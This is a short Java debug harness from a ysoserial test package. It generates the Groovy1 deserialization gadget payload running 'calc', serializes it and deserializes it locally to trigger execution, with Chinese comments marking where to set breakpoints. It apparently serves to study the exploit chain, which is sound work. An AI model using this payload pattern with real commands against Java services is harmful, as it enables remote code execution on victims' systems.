package ysoserial.test;

import ysoserial.payloads.Groovy1;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

public class DebugGroovy1 {
    public static void main(String[] args) throws Exception {
        System.out.println("Generating Groovy1 payload for 'calc'...");

        // 1. 生成 Payload
        // 这里直接 new Groovy1 对象，获取恶意的 InvocationHandler
        Object payload = new Groovy1().getObject("calc");

        // 2. 序列化 (模拟攻击者发送数据)
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(payload);
        oos.close();

        // 3. 反序列化 (模拟受害者接收数据 - 真正触发漏洞的地方)
        System.out.println("Deserializing payload... 准备爆炸！");

        ByteArrayInputStream bais = new ByteArrayInputStream(barr.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);

        // 【建议在此行打断点，按 F7 Step Into 进入】
        // 或者直接在 ConvertedClosure.invokeCustom() 打断点
        ois.readObject();
    }
}
